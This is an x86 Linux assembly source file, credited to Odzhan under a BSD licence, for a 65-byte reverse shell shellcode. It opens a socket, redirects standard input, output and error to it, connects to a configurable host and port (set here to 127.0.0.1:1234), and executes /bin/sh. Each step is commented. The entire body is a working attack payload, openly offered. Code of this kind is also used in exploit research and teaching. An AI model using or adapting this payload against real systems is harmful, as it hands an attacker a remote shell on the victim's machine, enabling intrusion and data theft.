;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 65 byte reverse shell for Linux/x86
; odzhan

    %include "include.inc"
    
    %define PORT 1234
	%define HOST 0x0100007f        ; 127.0.0.1
      
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push   SYS_socketcall
    pop    eax
    cdq    
    push   edx               ; protocol = IPPROTO_IP
    push   SOCK_STREAM
    push   AF_INET
    mov    ecx, esp          ; ecx      = &args
    int    0x80
    
    xchg   eax, ebx          ; ebx      = s
    
    ; step 2, assign socket to stdin, stdout, stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)    
    pop    ecx               ; ecx=2
c_dup:
    mov    al, SYS_dup2
    int    0x80 
    dec    ecx
    jns    c_dup             ; while (ecx >= 0)
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));   
    push   HOST
    push   ((htons(PORT) << 16) | AF_INET) & 0xFFFFFFFF
    mov    ecx, esp
    
    mov    al, SYS_socketcall    
    push   eax               ; sizeof(sa)
    push   ecx               ; &sa
    push   ebx               ; sockfd
    mov    ecx, esp          ; &args
    push   SYS_CONNECT
    pop    ebx
    int    0x80
    
    ; step 4, execute /bin/sh
    ; execve("/bin//sh", 0, 0);    
    mov    al, SYS_execve
    push   edx               ; '\0'
    push   '//sh'            ; 
    push   '/bin'            ; 
    mov    ebx, esp          ; ebx="/bin//sh", 0
    xor    ecx, ecx
    int    0x80              ; exec SYS_execve
